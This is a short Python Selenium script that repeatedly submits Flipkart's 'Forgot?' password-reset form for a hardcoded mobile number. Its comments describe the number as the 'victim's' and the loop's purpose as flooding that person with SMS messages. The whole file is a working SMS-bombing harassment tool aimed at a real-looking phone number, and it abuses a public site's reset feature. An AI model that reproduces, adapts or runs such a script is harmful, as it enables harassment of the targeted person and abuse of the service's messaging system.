from selenium import webdriver
import time

# create instance of Chrome webdriver
browser = webdriver.Chrome()

# set the frequency of sms
frequency = 10

# target mobile number, change it to victim's number and also ensure that it's registered on flipkart

mobile_number ="7079818064"


for i in range(frequency):

	browser.get('https://www.flipkart.com/account/login?ret =/')

	# find the element where we have to enter the number using the class name
	number = browser.find_element_by_class_name('_2zrpKA')

	# automatically type the target number
	number.send_keys("7079818064")

	# find the element to send a forgot password request using it's class name
	forgot = browser.find_element_by_link_text('Forgot?')

	# clicking on that element
	forgot.click()
	
	# set the interval to send each sms
	time.sleep(10)


# Close the browser
browser.quit()
